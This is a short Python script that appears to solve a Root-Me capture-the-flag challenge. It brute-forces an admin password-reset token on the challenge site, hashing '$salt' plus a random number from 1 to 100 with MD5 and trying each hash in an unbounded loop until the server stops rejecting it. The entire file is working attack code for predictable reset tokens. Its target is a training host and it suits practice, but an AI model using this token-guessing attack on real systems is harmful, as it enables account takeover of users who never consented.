import urllib.request
import urllib.parse
import re
import hashlib
import random

i=0
while True:
	token = '$salt' + str(random.randint(1,100))
	token = hashlib.md5(token.encode('utf-8'))
	token = token.hexdigest()
	token = token.encode('utf-8')
	token = re.sub('b\'', '', str(token))
	token = re.sub('\'', '', str(token))
	print(token+"\n\n")
	url = "http://challenge01.root-me.org/realiste/ch14/?p=forgot_dev&username=admin&token="+token

	req = urllib.request.Request(url)
	resp = urllib.request.urlopen(req)
	resp = str(resp.read())
	if resp.find('Token non') == -1:
			print(resp)
			break
	print(str(i)+"\n")
	i = i+1